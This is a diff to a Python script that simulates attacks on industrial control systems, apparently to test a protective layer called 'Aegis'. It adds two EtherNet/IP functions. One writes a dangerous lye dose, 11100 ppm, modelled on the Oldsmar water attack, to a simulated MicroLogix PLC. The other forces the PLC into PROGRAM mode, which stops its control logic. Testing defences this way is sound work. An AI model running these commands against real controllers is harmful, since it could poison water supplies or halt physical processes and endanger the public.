@@ -157,3 +157,38 @@ if __name__ == "__main__":
     fn = {"lye": lye_attack, "mask": mask_attack, "readwrite": readwrite_attack, "coil": coil_attack,
           "recon": recon_attack, "flood": flood_attack}[a.attack]
     print(asyncio.run(fn(a.port, host=a.host)))
+
+
+# ---------------- EtherNet/IP (the path a Rockwell HMI uses to a MicroLogix) ----------------
+def _cip_client(port: int, host: str = "127.0.0.1"):
+    from .cip import PCCCClient
+    ip = ATTACKER_IP if (ATTACKER_IP and host.startswith("127.")) else None
+    return PCCCClient(host, port, TAGS, local_ip=ip)
+
+
+async def cip_lye_attack(port: int, value: int = 11100, host: str = "127.0.0.1") -> str:
+    """The Oldsmar number, sent the way FactoryTalk / RSLinx would: PCCC typed write to N7:1 over EtherNet/IP."""
+    c = _cip_client(port, host)
+    addr = TAGS.holding["naoh_dose"].pccc
+    try:
+        await c.write(addr, value)
+        return f"EtherNet/IP PCCC write {addr} (lye) = {value} ppm: ACCEPTED by PLC"
+    except PermissionError:
+        return f"EtherNet/IP PCCC write {addr} (lye) = {value} ppm: REJECTED by Aegis"
+    except ConnectionError as e:
+        return f"EtherNet/IP: no connection ({e})"
+    finally:
+        await c.close()
+
+
+async def cip_program_mode_attack(port: int, host: str = "127.0.0.1") -> str:
+    """Switch the PLC to PROGRAM mode (stops the control logic; the first step of a logic download)."""
+    c = _cip_client(port, host)
+    try:
+        sts = await c.change_mode(program=True)
+        return "EtherNet/IP change mode -> PROGRAM: " + ("ACCEPTED: PLC logic stopped" if sts == 0 else
+                                                         "REJECTED by Aegis (PCCC status 0x%02X)" % sts)
+    except ConnectionError as e:
+        return f"EtherNet/IP: no connection ({e})"
+    finally:
+        await c.close()
